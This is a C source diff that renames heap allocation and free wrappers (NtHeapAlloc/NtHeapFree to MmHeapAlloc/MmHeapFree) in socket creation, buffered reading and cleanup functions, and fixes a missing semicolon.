@@ -178,7 +178,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
     }
 
     /* Allocate our Socket object */
-    Socket               = NtHeapAlloc( sizeof( SOCKET_DATA ) );
+    Socket               = MmHeapAlloc( sizeof( SOCKET_DATA ) );
     Socket->ID           = RandomNumber32();
     Socket->ParentID     = ParentID;
     Socket->Type         = Type;
@@ -333,7 +333,7 @@ VOID SocketRead()
 
                 if ( PartialData.Length > 0 )
                 {
-                    PartialData.Buffer = NtHeapAlloc( PartialData.Length );
+                    PartialData.Buffer = MmHeapAlloc( PartialData.Length );
 
                     if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
                         Failed    = TRUE;
@@ -351,12 +351,12 @@ VOID SocketRead()
                         else
                         {
                             // allocate a new buffer to store the old and new data
-                            NewBuffer = NtHeapAlloc( FullData.Length + PartialData.Length );
+                            NewBuffer = MmHeapAlloc( FullData.Length + PartialData.Length );
                             // copy the old data into the new buffer
                             MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
                             // free the old 'FullData' buffer
                             MemSet( FullData.Buffer, 0, FullData.Length );
-                            NtHeapFree( FullData.Buffer );
+                            MmHeapFree( FullData.Buffer );
                             // set the new buffer into 'FullData'
                             FullData.Buffer = NewBuffer;
                             NewBuffer = NULL;
@@ -365,7 +365,7 @@ VOID SocketRead()
                             FullData.Length += PartialData.Length;
                             // free the new data
                             MemSet( PartialData.Buffer, 0, PartialData.Length );
-                            NtHeapFree( PartialData.Buffer );
+                            MmHeapFree( PartialData.Buffer );
                             PartialData.Buffer = NULL;
                         }
                     }
@@ -412,7 +412,7 @@ VOID SocketRead()
             {
                 /* free and clear out our buffer */
                 MemSet( FullData.Buffer, 0, FullData.Length );
-                NtHeapFree( FullData.Buffer );
+                MmHeapFree( FullData.Buffer );
                 FullData.Length = 0;
                 FullData.Buffer = NULL;
             }
@@ -475,7 +475,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
     }
 
     MemSet( Socket, 0, sizeof( SOCKET_DATA ) );
-    NtHeapFree( Socket )
+    MmHeapFree( Socket );
     Socket = NULL;
 }
 
